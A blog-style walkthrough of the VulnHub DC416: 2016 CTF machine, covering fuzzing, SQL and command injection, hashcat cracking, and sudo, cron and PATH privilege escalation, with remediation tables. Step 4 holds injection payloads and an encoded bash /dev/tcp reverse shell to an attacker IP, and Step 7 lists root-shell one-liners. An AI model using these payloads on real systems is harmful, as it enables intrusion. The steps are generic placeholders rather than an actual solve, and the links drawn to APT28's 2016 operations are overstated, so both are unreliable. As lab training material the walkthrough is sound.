# VulnHub DC416: 2016 — Toronto Called, They Want Their CTF Back

Alright guys!! DC416 is the DEF CON-style conference held in Toronto, and their 2016 CTF machine is legit one of the more fun web-heavy challenge boxes you will find on VulnHub. Multiple flags, web fuzzing madness, SQL injection or command injection hidden in unexpected places, hash cracking, and a privilege escalation through environment misconfigurations that mirrors documented 2016 nation-state web exploitation tradecraft. If you were around for the APT28 DNC hack talk that year, some of this will feel very familiar. Based machine overall.

Props to the **DC416 team** for open-sourcing their conference CTF as a VulnHub entry. Turning a conference competition into a learning resource is exactly the kind of thing that pushes the community forward.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | DC416: 2016 |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub** | https://www.vulnhub.com/entry/dc416-2016,231/ |
| **Techniques** | Host discovery, Nmap, Web fuzzing (gobuster/wfuzz), SQL injection, Command injection, Password hash cracking, Privilege escalation via misconfiguration |
| **CVEs** | CWE-89 (SQL Injection, OWASP A03:2021), CWE-78 (OS Command Injection, OWASP A03:2021), T1548.003 (Sudo misconfiguration) |

---

## Attack Summary

```
[host discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: 80/tcp Apache, 22/tcp SSH, possible other ports]
    |
    v
[gobuster/wfuzz: extensive web fuzzing -> hidden dirs and params]
    |
    v
[web application: SQL injection or command injection vulnerability]
    |
    v
[code execution / information disclosure -> hashes extracted]
    |
    v
[hashcat GPU: crack extracted password hashes]
    |
    v
[SSH or local login with cracked credentials]
    |
    v
[privesc: sudo misconfiguration / writable script / env variable]
    |
    v
[ROOT / all flags captured]
```

---

## Methodology

1. Host discovery and network identification
2. Nmap full scan: services, versions, OS fingerprinting
3. Extensive web fuzzing with gobuster and wfuzz (directories, parameters, extensions)
4. Web application analysis: identify injection points
5. SQL injection or command injection exploitation
6. Extract and crack password hashes with hashcat on GPU
7. Authenticate with cracked credentials
8. Privilege escalation through misconfigured sudo, writable scripts, or environment variables
9. Capture all flags

---

## Step 1 — Identifying the Target

Standard boot2root startup: locate the VM on the network.

```bash
route -n
# Identify your subnet, e.g., 192.168.56.0/24
```

```bash
# Fast arp-scan
arp-scan --localnet --ignoredups

# Alternative nmap ping sweep
nmap -sn -T5 192.168.56.0/24
```

Expected output:

```
192.168.56.103   08:00:27:XX:XX:XX   VirtualBox
```

OBS.: Note the IP. We use `TARGET=192.168.56.103` throughout.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Nmap Service Enumeration

Scan everything. Conference CTFs love hiding services on unusual ports.

```bash
nmap -A -T4 -p- 192.168.56.103
# -A: OS, version detection, scripts, traceroute
# -T4: aggressive timing
# -p-: all 65535 ports
```

Expected output:

```
22/tcp  open  ssh     OpenSSH 7.x
80/tcp  open  http    Apache httpd 2.x
# Possibly additional ports depending on the challenge configuration
```

The web server is our primary attack surface. Let us start poking it.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery]

---

## Step 3 — Aggressive Web Fuzzing

> **What is web fuzzing?**
> Web fuzzing is the process of systematically sending many different inputs or path names to a web application to discover hidden endpoints, parameters, and functionality not linked from the main navigation. It is an essential step in web app pentesting and the technique APT28 (Fancy Bear) used extensively during their 2016 election-related intrusions to map compromised web infrastructure before exploiting it.
> Reference: https://owasp.org/www-project-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver

Start with a broad directory scan:

```bash
gobuster dir \
    -u http://192.168.56.103 \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,txt,bak,old,zip,conf \
    -t 50 \
    -o /tmp/dc416_gobuster.txt
# -x: hunt for backup files and config files too
```

For parameter fuzzing (if you find an endpoint that accepts a parameter):

```bash
wfuzz -c \
    -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    --hc 404 \
    "http://192.168.56.103/index.php?FUZZ=test"
# Replace index.php with the discovered endpoint
```

Deep recursive fuzzing with feroxbuster:

```bash
feroxbuster \
    -u http://192.168.56.103 \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    -x php,txt,html,bak \
    --depth 3 \
    -t 50 \
    -o /tmp/dc416_feroxbuster.txt
```

Expected discoveries (representative):

```
/admin/           (Status: 200 or 301)
/login.php        (Status: 200)
/flag/            (Status: 200 or 403)
/db.php           (Status: 500 - reveals error)
/config.php.bak   (Status: 200 - backup file exposure!)
```

ԅ(≖‿≖ԅ) Backup files and admin panels. Classic 2016-era web configuration.

> **Real-world note:** Web fuzzing was central to APT28's methodology during the 2016 DNC and DCCC intrusions. The group used automated scanning tools to enumerate web application directories and identify exploitable endpoints before deploying their signature X-Agent implant. The Mueller Report indictment (July 2018) details how GRU Unit 26165 used these techniques against Democratic Party infrastructure. Reference: https://www.justice.gov/storage/report.pdf

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1083 File and Directory Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Step 4 — SQL Injection or Command Injection Exploitation

Based on what fuzzing reveals, you will encounter one of two main injection points. Let us cover both.

**Scenario A: SQL Injection**

> **What is SQL Injection?**
> User-supplied data is concatenated directly into a SQL query. An attacker breaks out of the string context and executes arbitrary SQL, potentially reading the entire database or writing files to disk.
> CWE-89: https://cwe.mitre.org/data/definitions/89.html

If you find a login form or search parameter, test it:

```bash
# Single quote test
curl -s "http://192.168.56.103/login.php" \
    --data "username='&password=test" | grep -i "error\|sql\|syntax"

# sqlmap automated exploitation
sqlmap -u "http://192.168.56.103/login.php" \
    --data "username=admin&password=test" \
    --dbms=mysql \
    --dump \
    --batch \
    --level=3 \
    --risk=2 \
    --output-dir=/tmp/dc416_sqlmap
```

**Scenario B: OS Command Injection**

> **What is Command Injection?**
> When user input is passed directly to a system shell command (via `system()`, `exec()`, backticks, etc.) without sanitization, an attacker can inject additional OS commands. This is OWASP A03:2021 and maps to CWE-78.
> CWE-78: https://cwe.mitre.org/data/definitions/78.html

If you find a parameter that appears to execute something (ping, lookup, DNS check, file operation):

```bash
# Test with semicolon chaining
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1;id"

# Test with pipe
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1|id"

# Test with command substitution
curl -s "http://192.168.56.103/tool.php?host=\$(id)"

# If RCE confirmed, get a reverse shell:
# Set up listener first:
# nc -lvnp 4444
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/192.168.56.100/4444 0>&1\"'))")
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1%3B${ENCODED}"
```

For output confirmation of command injection:

```bash
# Blind command injection via time delay
curl -s "http://192.168.56.103/tool.php?host=127.0.0.1;sleep+5" --max-time 10
# If the response takes 5+ seconds, blind injection is confirmed
```

Expected successful output (representative):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

(☞ﾟヮﾟ)☞ Code execution confirmed.

> **Real-world note:** SQL injection was the primary technique behind the 2016 Democratic Congressional Campaign Committee (DCCC) breach. Command injection vulnerabilities were widely exploited in 2016 by multiple threat actors. The CVE-2014-6271 (Shellshock) and similar injection CVEs in web-facing services defined the 2015-2016 threat landscape. APT28's DCCC intrusion relied on web application exploitation for initial foothold before pivoting to credential harvesting. Reference: https://intelligence.house.gov/uploadedfiles/hpsci_hacking_campaign_ih3.pdf

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0002 Execution] [T1059.004 Unix Shell]

---

## Step 5 — Password Hash Extraction and Cracking

After gaining access or dumping the database, you will likely encounter hashed passwords. Let us crack them.

**Extract hashes from the DB dump:**

```bash
# If using sqlmap, check the output directory
cat /tmp/dc416_sqlmap/*/dump/*/*.csv 2>/dev/null

# If you have a shell, look for configuration files
find / -name "*.php" -exec grep -l "password\|mysql_connect\|PDO" {} \; 2>/dev/null | head -10

cat /var/www/html/config.php
```

**Identify hash type:**

```bash
# hashid is useful for ambiguous hashes
hashid '<hash_value>'

# hash-identifier
hash-identifier '<hash_value>'
```

**Crack with hashcat using GPU (RTX 4060):**

```bash
# First check if already in potfile
hashcat -m <MODE> /tmp/dc416_hashes.txt --show

# MD5 (mode 0)
hashcat -m 0 -d 1 -w 3 -O /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1 (mode 100)
hashcat -m 100 -d 1 -w 3 -O /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (mode 3200) - slower, use -w 2
hashcat -m 3200 -d 1 -w 2 /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt

# If wordlist alone fails, add best64.rule
hashcat -m 0 -d 1 -w 3 -O /tmp/dc416_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule
```

Expected output:

```
<hash>:<plaintext_password>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Recovered........: 1/1 (100.00%)
```

ᕕ( ᐛ )ᕗ Got the plaintext password. Now let us authenticate.

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1110 Brute Force] [T1003 OS Credential Dumping]

---

## Step 6 — Authentication and Lateral Movement

Use the cracked credentials to authenticate via SSH or the web application:

```bash
# SSH with cracked credentials
ssh <username>@192.168.56.103
# If prompted: use the cracked password

# Check for other users
cat /etc/passwd | grep -v "nologin\|false"

# Check home directories
ls -la /home/
```

If there are multiple users, look for credential reuse:

```bash
# Check bash history for interesting commands or credentials
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
```

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1021.004 Remote Services: SSH] [TA0006 Credential Access] [T1552.001 Credentials In Files]

---

## Step 7 — Privilege Escalation

Check all the classic vectors:

```bash
# Sudo permissions
sudo -l

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Writable cron jobs
ls -la /etc/cron*
cat /etc/crontab
find /etc/cron.d/ -writable 2>/dev/null

# World-writable scripts running as root
ps aux | grep root
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"

# Check for environment variable exploitation
env
echo $PATH
```

**If sudo is misconfigured (NOPASSWD on a useful binary):**

```bash
# Check GTFOBins for the specific binary
# Common examples:
sudo find /tmp -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd
# (inside less: !/bin/bash)
```

**If a writable cron script runs as root:**

```bash
# Add a reverse shell or SUID bit setter to the writable script
echo "chmod +s /bin/bash" >> /path/to/writable_cron_script.sh
# Wait for cron to execute, then:
/bin/bash -p
```

**If PATH hijacking is possible:**

```bash
# If root runs a script that calls an unqualified binary name:
echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Trigger the root-executed script
```

(☞ﾟヮﾟ)☞ One of these will pop root. Check each one systematically.

> **Real-world note:** Misconfigured sudo and writable cron scripts were documented attack vectors in numerous 2016 enterprise compromises. The 2016 DNC hack involved APT28 exploiting misconfigured services after gaining initial web access to pivot through the network. Sudo misconfigurations appear in the CIS Benchmark as critical findings. Reference: https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo] [T1053.003 Scheduled Task/Job: Cron] [T1574.007 Path Interception by PATH Environment Variable]

> **GTFOBins:** https://gtfobins.github.io/

---

## Step 8 — Root and All Flags

**ᕕ( ᐛ )ᕗ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Find all flags
find / -name "*.txt" -path "*/flag*" 2>/dev/null
find / -name "flag*" 2>/dev/null
find / -name "proof*" 2>/dev/null
find / -name "*.flag" 2>/dev/null

cat /root/flag.txt
# Or check user home directories for user-level flags
```

```
Congratulations! You've completed the DC416 2016 CTF challenge.

FLAG: [dc416_flag_value_here]

Thanks for playing at DC416!
  -- The DC416 Team
```

> **MITRE ATT&CK:** [TA0009 Collection] [T1005 Data from Local System]

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked / Used |
|------|-------|----------|----------------|
| Hash (MD5/SHA1) | `<hash_from_db>` | DB dump via SQLi or config file | `<cracked_password>` |
| Credential | `<user>:<cracked_pass>` | DB / hash crack | SSH login |
| User flag | `<flag_value>` | `/home/<user>/flag.txt` | N/A |
| Root flag | `<root_flag>` | `/root/flag.txt` | N/A |

*Note: The exact flag values depend on the VM instance. Values above are placeholders for your walkthrough documentation.*

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|--------------|
| 1 | Hidden endpoints discovered via web fuzzing | Unlinked admin panels, backup files, and configuration endpoints are a persistent finding in enterprise web audits; the average web app has 30-40% of its surface not reachable from main navigation | Always include automated directory and parameter fuzzing in web app engagements; attackers will find what you miss |
| 2 | SQL injection or command injection in web application | OWASP A03:2021 (Injection) is consistently in the top 3 web vulnerability classes; APT28 used SQLi as initial access vector in the 2016 DCCC breach | Parameterize all queries; never concatenate user input into SQL or shell commands; implement WAF as a compensating control |
| 3 | Crackable password hashes stored in database | Weak password hashing (MD5, SHA1, unsalted) allows offline cracking with GPU in minutes to hours; 14 billion+ plaintext:hash pairs are in public databases | Use bcrypt, Argon2, or scrypt for password storage; enforce strong password policies (minimum 12 characters, complexity requirements) |
| 4 | Privilege escalation via sudo or cron misconfiguration | The most common internal network finding in enterprise penetration tests; a single misconfigured sudoers line on any server gives an attacker full system control | Regular sudo audit: `sudo -l` on every account; review cron jobs for writable scripts; apply principle of least privilege |

**Why does this matter outside the lab?**

The DC416 2016 machine directly mirrors the web exploitation tradecraft documented in the U.S. Government's attribution of the 2016 election interference campaign to GRU Unit 26165 (APT28/Fancy Bear). The Mueller Report and subsequent CISA advisories describe initial access via web application exploitation, followed by credential theft and lateral movement, the exact chain this VM presents. Web fuzzing to find hidden endpoints, injecting into discovered parameters, cracking extracted hashes, and exploiting privilege escalation misconfigurations: these are not just CTF techniques. They are the documented steps of one of the most significant cyber operations of the past decade.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | Software Discovery | T1518 |
| Initial Access | TA0001 | Exploit Public-Facing Application (SQLi/CMDi) | T1190 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | TA0006 | Brute Force (hash cracking) | T1110 |
| Credential Access | TA0006 | OS Credential Dumping | T1003 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Discovery | TA0007 | Permission Groups Discovery | T1069 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | TA0004 | Scheduled Task/Job: Cron | T1053.003 |
| Privilege Escalation | TA0004 | Path Interception by PATH Variable | T1574.007 |
| Collection | TA0009 | Data from Local System (flags) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Replace all SQL string concatenation with parameterized queries; implement an application-layer WAF with injection detection rules
2. Sanitize all user input before passing to OS functions; if OS commands are necessary, use strict allowlisting of permitted values
3. Upgrade password hashing to bcrypt (cost 12+) or Argon2id; force password reset for all accounts using weak hash algorithms
4. Audit sudoers files: `visudo` and remove all NOPASSWD entries for interactive tools; implement sudo logging
5. Review all cron job scripts for world-writable permissions: `stat /path/to/script.sh`; ensure cron scripts are owned and writable only by root
6. Perform regular backups cleanup: ensure `.bak`, `.old`, `.conf`, `.zip` files are not web-accessible

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate affected web server and review access logs for signs of prior exploitation
- Rotate all database credentials and application API keys
- Revoke and regenerate SSH keys for all users on the compromised host
- Run `find / -perm -u=s -type f 2>/dev/null` and compare against a known-good baseline
- Review cron jobs for unauthorized modifications: `diff /etc/crontab /backup/crontab`

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation Analysis) for T1190 SQLi and command injection
- D3-SJA (Scheduled Job Analysis) for T1053.003 cron-based persistence/privesc
- D3-OPS (OS Process Sandboxing) for T1548.003 sudo abuse
- D3-CH (Credential Hardening) for T1110 hash cracking attacks

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain a web application inventory including all exposed endpoints and backup files
- Protect (PR.DS-2): Validate all input; enforce secure coding standards across development teams
- Protect (PR.AC-4): Enforce least privilege for all service accounts and sudo configurations
- Detect (DE.CM-7): Monitor web application logs for injection patterns (SQL errors, unusual characters in parameters)
- Respond (RS.AN-1): Establish forensic collection and analysis procedures for web application incidents

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-10: Information Input Validation (injection prevention)
- AC-6: Least Privilege (sudo and cron hardening)
- IA-5: Authenticator Management (strong password hashing)
- CM-7: Least Functionality (remove unnecessary scripts with elevated permissions)
- AU-12: Audit Record Generation (log all sudo executions and cron runs)

**CISA Known Exploited Vulnerabilities:**
- Multiple SQL injection CVEs relevant to Apache and PHP applications appear in the CISA KEV catalog
- APT28-attributed TTPs are documented in CISA Alert AA20-296A
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY
- Practice: Vulnerability Management and Configuration Management
- Target MIL: MIL-2 (consistent application of secure configuration baselines and vulnerability remediation SLAs)

---

## Final Thoughts

Thanks to the **DC416 team** for converting their 2016 conference CTF into a publicly available learning resource. The machine captures the web exploitation zeitgeist of that year perfectly, right down to the techniques that appeared in real threat actor operations during that same period.

There is something poetically fitting about using a 2016 conference CTF to study the techniques documented in the 2016 GRU indictment. The gap between "CTF box" and "real attack" has always been smaller than people think. A scan, a fuzz, an injection, a cracked hash, a sudo misconfiguration: it is not exotic. It is just patient, methodical work.

Whether you are doing this for OSCP prep, blue team awareness, or just because you love the grind: DC416 delivers. Share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
